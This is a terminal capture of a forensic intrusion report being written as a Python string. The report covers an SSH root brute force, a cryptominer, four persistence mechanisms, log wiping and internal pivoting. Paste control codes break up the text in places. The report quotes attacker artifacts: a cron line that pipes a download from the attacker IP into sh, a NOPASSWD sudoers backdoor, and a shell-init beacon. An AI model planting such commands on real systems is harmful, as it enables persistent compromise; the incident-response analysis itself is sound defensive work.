| ATT&CK I[?2004h> intrusion_report = '''# Post-Compromise Forensic Intrusion Report
[?2004lption | Evidence Citation | Alert Statu[?2004h> 
[?2004ls[?2004h> ## Executive Summary
[?2004l[?2004h> Host `ssh-prod-01` (CentOS 7 Linux) suffered a multi-stage compromise initiated via external SSH root credential brute-forcing. The attacker successfully authenticated as `root`, deployed an XMRig Monero cryptominer, established multi-layered persistence across four distinct mechanisms (cron, systemd service, shell init, and a sudoers backdoor), cleared system authentication logs to evade detection, and conducted internal reconnaissance/pivoting via `hydra` against internal targets.
[?2004l[?2004h> 
[?2004l[?2004h> ## Attacker Entities and Indicators of Compromise (IoCs)
[?2004l[?2004h> - **Origin Attacker IP:** `198.51.100.78` (`/disk/var/log/secure:178`, `/sas/cti/advisory.txt`)
[?2004l[?2004h> - **C2 Beacon Domain:** `update-ssh.example.cn` (`/disk/var/lib/.cache/.wiped.bin`, `/sas/cti/advisory.txt`)
[?2004l[?2004h> - **Cryptomining Pool:** `stratum+tcp://xmr.ssh.evil:3333` (`/disk/tmp/.X11-unix/.xorg`, `/sas/cti/advisory.txt`)
[?2004l[?2004h> - **Monero Wallet Address:** `4A0000000000000000000d1ec67074f7` (`/disk/tmp/.X11-unix/.xorg`, `/sas/cti/advisory.txt`)
[?2004l[?2004h> - **Malware Process PID:** `1337` (`/disk/tmp/.X11-unix/.xorg`)
[?2004l[?2004h> - **Malware Binary Location:** `/tmp/.X11-unix/.xorg` (`/disk/tmp/.X11-unix/.xorg`, `/sas/alerts.json`)
[?2004lreport = ''[?2004h> - **Malware Binary SHA256 Hash:** `52a70f2460b5bc530fc1a00627fcd72c43545a2bcb2bf5cfe2291b50a73d4253` (`/disk/tmp/.X11-unix/.xorg`)
[?2004l[?2004h> 
[?2004ls[?2004h> ## Comprehensive Attack Chain Analysis
[?2004l[?2004h> 
[?2004l [?2004h> ### 1. Initial Access & Credential Access
[?2004ldi[?2004h> The attacker initiated a high-frequency SSH password brute-force campaign against host `ssh-prod-01` targeting common accounts (`oracle`, `test`, `admin`, `postgres`, `root`) from source IP `198.51.100.78` (`/disk/var/log/secure:141`). At 2026-08-15 00:54:55 UTC, the attacker successfully authenticated as user `root` due to weak root credentials and permissive SSH baseline configurations (`/disk/var/log/secure:178`, `/disk/etc/ssh/sshd_config`).
[?2004l[?2004h> 
[?2004l [?2004h> ### 2. Execution & Impact (Cryptomining)
[?2004lep C[?2004h> Upon gaining root access, the attacker dropped and executed an XMRig cryptominer binary at `/tmp/.X11-unix/.xorg` (`/disk/tmp/.X11-unix/.xorg`). The process ran under PID 1337, connecting to Monero mining pool `stratum+tcp://xmr.ssh.evil:3333` using wallet `4A0000000000000000000d1ec67074f7` (`/disk/tmp/.X11-unix/.xorg`, `/sas/alerts.json`).
[?2004l[?2004h> 
[?2004lp[?2004h> ### 3. Persistence Mechanisms (Alerted vs. Silent/Unalerted)
[?2004l/cti/advi[?2004h> The attacker established four separate persistence mechanisms across the system:
[?2004l/d[?2004h> 1. **Cron Persistence (Alerted CHK-11):** A cron entry in `/var/spool/cron/root` scheduled a recurring curl payload `curl hxxp://198.51.100.78/x | sh` to re-drop malware (`/disk/var/spool/cron/root:5`, `/sas/alerts.json`).
[?2004l[?2004h> 2. **Systemd Service Persistence (Alerted CHK-13):** A malicious systemd unit file was placed at `/etc/systemd/system/system-update-helper.service` to auto-start a miner re-dropper on boot (`/disk/etc/systemd/system/system-update-helper.service`, `/sas/alerts.json`).
[?2004l[?2004h> 3. **Shell Initialization Persistence (SILENT / Unalerted):** A `PROMPT_COMMAND` beacon pointing to `198.51.100.78` was injected into `/root/.bashrc` to execute whenever an interactive root shell is opened (`/disk/root/.bashrc:2`).
[?2004l[?2004h> 4. **Privilege Escalation Sudo Backdoor (SILENT / Unalerted):** A drop-in sudoers file was created at `/etc/sudoers.d/devops` granting user `devops` unrestricted root privileges via `devops ALL=(ALL) NOPASSWD: ALL` (`/disk/etc/sudoers.d/devops:3`).
[?2004l[?2004h> 
[?2004l[?2004h> ### 4. Defense Evasion (Log Wiping)
[?2004l[?2004h> To cover their tracks, the attacker wiped system authentication logs, creating an anti-forensic gap in `/var/log/secure` between 00:54:55 UTC and 01:29:12 UTC (`/disk/var/log/secure:178`). Residue of the wiping utility and domain C2 beacon were recovered from `/var/lib/.cache/.wiped.bin` (`/disk/var/lib/.cache/.wiped.bin`).
[?2004l[?2004h> 
[?2004ls[?2004h> ### 5. Lateral Movement & Internal Pivoting
[?2004lnesses[?2004h> From the compromised foothold, the attacker utilized the `devops` user account context to run `hydra` SSH brute-force attacks against internal network targets, as evidenced by shell history residue (`/disk/home/devops/.bash_history:6`).
[?2004l[?2004h> 
[?2004l[?2004h> ## MITRE ATT&CK Technique Mapping
